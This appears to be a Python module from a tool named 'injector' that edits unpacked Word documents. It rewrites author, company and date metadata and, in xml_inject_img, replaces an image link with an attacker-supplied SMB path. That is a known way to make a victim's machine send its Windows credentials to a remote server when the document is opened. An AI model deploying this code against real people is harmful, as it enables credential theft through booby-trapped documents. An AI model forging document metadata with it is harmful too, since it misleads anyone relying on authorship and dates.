import os;
import xml.dom.minidom as md;
from injector import bcolors, log;

class Xmls:
    def __init__(self, path:str):
        self.path = path;

        self.creator = '';
        self.lastmodifiedby = '';
        self.company = '';
        self.application = '';

        self.created = '';
        self.modified = '';

        self.revision = -1;
        self.totaltime = -1;
        return;

    def xml_value_get(self, doc, tag:str): # return data by found first tag
        try:
            return doc.getElementsByTagName(tag)[0].childNodes[0].data;
        except Exception as ex:
            if str(ex) != 'list index out of range': log(str(ex), bcolors.FAIL);
            return None;

    def xml_value_set(self, doc, tag:str, value:any): # set data by found first tag
        doc.getElementsByTagName(tag)[0].childNodes[0].nodeValue = value;
        return;

    def xml_parse(self, path:str):
        return md.parse(path);

    def xml_metadata_get(self): # gathering autor, last modified author, creation and modification date in docProps/app.xml and docProps/core.xml

        ret = True;
        try:
            appxml = self.xml_parse(os.path.join(self.path, 'docProps\\app.xml'));
            if appxml is None: raise Exception('[ERR] can\'t parse \'docProps\\app.xml\'');
 
            self.company = self.xml_value_get(appxml, 'Company');
            self.application = self.xml_value_get(appxml, 'Application');
            self.totaltime = self.xml_value_get(appxml, 'TotalTime');

            # need a strict check?
            if not self.company or not self.application or not self.totaltime:
                log('[WRN] missing some metadata from app.xml', bcolors.WARNING);
        
            corexml = self.xml_parse(os.path.join(self.path, 'docProps\\core.xml'));
            if corexml is None: raise Exception('[ERR] can\'t parse \'docProps\\core.xml\'');
    
            self.created = self.xml_value_get(corexml, 'dcterms:created');
            self.creator = self.xml_value_get(corexml, 'dc:creator');
            self.lastmodifiedby = self.xml_value_get(corexml, 'cp:lastModifiedBy');
            self.modified = self.xml_value_get(corexml, 'dcterms:modified');
            self.revision = self.xml_value_get(corexml, 'cp:revision');
        
            if not self.created or not self.creator or not self.lastmodifiedby or not self.modified or not self.revision:
                log('[WRN] missing some metadata from core.xml', bcolors.WARNING);
    
        except Exception as ex:
            log(str(ex), bcolors.FAIL);
            ret = False;
        return ret;

    def xml_file_write(self, doc:any, path:str): # write back changed xml
        try:
            xmlfile = open(path, 'w', encoding='utf-8');
            xmlfile.write(doc.toxml());
            xmlfile.close();
        except Exception as ex:
            log(str(ex), bcolors.FAIL);
            return False;
        return True;
    
    def xml_metadata_set(self): # writing metadata

        ret = True;
        try:
            appxml_path = os.path.join(self.path, 'docProps\\app.xml');
            appxml = self.xml_parse(appxml_path);
            if appxml is None: raise Exception('[ERR] can\'t parse \'docProps\\app.xml\'');

            if not self.company is None: self.xml_value_set(appxml, 'Company', self.company);
            if not self.application  is None: self.xml_value_set(appxml, 'Application', self.application);
            if not self.totaltime  is None: self.xml_value_set(appxml, 'TotalTime', self.totaltime);
            if not self.xml_file_write(appxml, appxml_path): raise Exception('[ERR] can\'t write \'docProps\\app.xml\'');
        
            corexml_path = os.path.join(self.path, 'docProps\\core.xml');
            corexml = self.xml_parse(corexml_path);
            if corexml is None: raise Exception('[ERR] can\'t parse \'docProps\\core.xml\'');
    
            if not self.created is None: self.xml_value_set(corexml, 'dcterms:created', self.created);
            if not self.creator is None: self.xml_value_set(corexml, 'dc:creator', self.creator);
            if not self.lastmodifiedby is None: self.xml_value_set(corexml, 'cp:lastModifiedBy', self.lastmodifiedby);
            if not self.modified is None: self.xml_value_set(corexml, 'dcterms:modified', self.modified);
            if not self.revision is None: self.xml_value_set(corexml, 'cp:revision', self.revision);
            if not self.xml_file_write(corexml, corexml_path): raise Exception('[ERR] can\'t write \'docProps\\core.xml\'');

        except Exception as ex:
            log(str(ex), bcolors.FAIL);
            ret = False;
        return ret;

    def xml_set_rid(self, doc:any, o:str, n:str):

        relationships = doc.getElementsByTagName("Relationship");
        for relationship in relationships:
            target = relationship.getAttribute('Target');
            if target == o:
                relationship.attributes['Target'].value = n;
                return True;
        return False;

    def xml_inject_img(self, server:str, url:str): # replacing image url by smb path

        try:
            document_xml_rels_path = os.path.join(self.path, 'word\\_rels\\document.xml.rels');
            document_xml_rels = self.xml_parse(document_xml_rels_path);
            if document_xml_rels is None:  raise Exception('[ERR] can\'t parse word\\_rels\\document.xml.rels\'');
            if not self.xml_set_rid(document_xml_rels, url, server): raise Exception('[ERR] can\'t find url in word\\_rels\\document.xml.rels\'. ');
    
            if not self.xml_file_write(document_xml_rels, document_xml_rels_path): raise Exception('[ERR] can\'t write \'word\\_rels\\document.xml.rels\'');
    
        except Exception as ex:
            log(str(ex), bcolors.FAIL);
            return False;

        return True;